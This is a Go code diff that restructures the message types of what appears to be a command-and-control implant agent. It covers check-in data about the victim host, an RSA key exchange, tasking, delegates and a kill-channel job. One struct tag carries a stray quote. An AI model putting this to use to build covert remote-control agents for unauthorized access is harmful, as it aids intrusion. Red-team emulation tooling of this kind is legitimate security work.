@@ -1,6 +1,7 @@
 package structs
 
 import (
+	"encoding/json"
 	"log"
 	"time"
 )
@@ -10,36 +11,104 @@ type Msg map[string]interface{}
 
 // Struct definition for main profile config
 type Mainconfig struct {
-	UUID      string   `json:"uuid"`
-	KEYX      bool     `json:"keyx"`
-	AESPSK    string   `json:"aespsk"`
-	BaseURL   string   `json:"baseurl"`
-	BaseURLS  []string `json:"baseurls"`
-	UserAgent string   `json:"useragent"`
-	Sleep     string   `json:"sleep"`
-	HostHeader string `json:"hostheader"`
+	UUID       string   `json:"uuid"`
+	KEYX       string   `json:"keyx"`
+	AESPSK     string   `json:"aespsk"`
+	BaseURL    string   `json:"baseurl"`
+	BaseURLS   []string `json:"baseurls"`
+	UserAgent  string   `json:"useragent"`
+	Sleep      string   `json:"sleep"`
+	HostHeader string   `json:"hostheader"`
 }
 
-type CheckInServerPayload struct {
-	Action string `json:"action"`
-	Id     string `json:"uuid"`
-	Status string `json:"status"`
-}
-
-type CheckInClientPayload struct {
-	Action         string `json:"action"`
+// Struct definition for CheckIn messages
+type CheckInMessage struct {
+	Action         string `json:"action""`
+	IP             string `json:"ip"`
+	OS             string `json:"os"`
 	User           string `json:"user"`
 	Host           string `json:"host"`
-	Pid            int    `json:"pid"`
-	IP             string `json:"ip"`
+	Pid            string `json:"pid"`
 	UUID           string `json:"uuid"`
-	OS             string `json:"os"`
 	Architecture   string `json:"architecture"`
 	Domain         string `json:"domain"`
+	IntegrityLevel int    `json:"integrity_level"`
 	ExternalIP     string `json:"external_ip"`
 	EncryptionKey  string `json:"encryption_key"`
 	DecryptionKey  string `json:"decryption_key"`
-	IntegrityLevel int    `json:"integrity_level"`
+}
+
+type CheckInMessageResponse struct {
+	Action string `json:"action"`
+	ID     string `json:"uuid"`
+	Status string `json:"status"`
+}
+
+// Struct definitions for EKE-RSA messages
+
+type EkeKeyExchangeMessage struct {
+	Action    string `json:"action"`
+	PubKey    string `json:"pub_key"`
+	SessionID string `json:"session_id"`
+}
+
+type EkeKeyExchangeMessageResponse struct {
+	Action     string `json:"action"`
+	UUID       string `json:"uuid"`
+	SessionKey string `json:"session_key"`
+	SessionId  string `json:"session_id"`
+}
+
+// Struct definitions for Tasking request messages
+
+type TaskRequestMessage struct {
+	Action      string             `json:"action"`
+	TaskingSize int                `json:"tasking_size"`
+	Delegates   []*json.RawMessage `json:"delegates"`
+}
+
+type TaskRequestMessageResponse struct {
+	Action    string             `json:"action"`
+	Tasks     []Task             `json:"tasks"`
+	Delegates []*json.RawMessage `json:"delegates"`
+}
+
+type Task struct {
+	Command   string `json:"command"`
+	Params    string `json:"params"`
+	Timestamp int    `json:"timestamp"`
+	TaskID    string `json:"task_id"`
+	Job       *Job
+}
+
+type Job struct {
+	KillChannel chan (int)
+	Stop        *int
+	Monitoring  bool
+}
+
+// Struct definitions for TaskResponse Messages
+type TaskResponseMessage struct {
+	Action    string             `json:"action"`
+	Responses []Response         `json:"responses"`
+	Delegates []*json.RawMessage `json:"delegates"`
+}
+
+type Response struct {
+	TaskID   string `json:"task_id"`
+	Response string `json:"response"`
+}
+
+type TaskResponseMessageResponse struct {
+	Action    string             `json:"action"`
+	Responses []ServerResponse   `json:"responses"`
+	Delegates []*json.RawMessage `json:"delegates"`
+}
+
+type ServerResponse struct {
+	TaskID string `json:"uuid"`
+	Status string `json:"status"`
+	Error  string `json:"error"`
 }
 
 //Message - struct definition for external C2 messages
@@ -59,14 +128,6 @@ type ThreadMsg struct {
 	Error      bool
 }
 
-// Task used to define a task received from apfell
-type Task struct {
-	Command string `json:"command"`
-	Params  string `json:"params"`
-	ID      string `json:"id"`
-	Job     *Job
-}
-
 // TaskStub to post list of currently processing tasks.
 type TaskStub struct {
 	Command string `json:"command"`
@@ -77,11 +138,6 @@ type TaskStub struct {
 // Job struct that will listen for messages on the kill channel,
 // set the Stop param to an exit code, and checks if it's in a
 // monitoring state.
-type Job struct {
-	KillChannel chan (int)
-	Stop        *int
-	Monitoring  bool
-}
 
 // ClientResponse used to define a task response struct
 type ClientResponse struct {
@@ -214,7 +270,7 @@ func (j *Job) SendKill() {
 func (t *Task) ToStub() TaskStub {
 	return TaskStub{
 		Command: t.Command,
-		ID:      t.ID,
+		ID:      t.TaskID,
 		Params:  t.Params,
 	}
 }
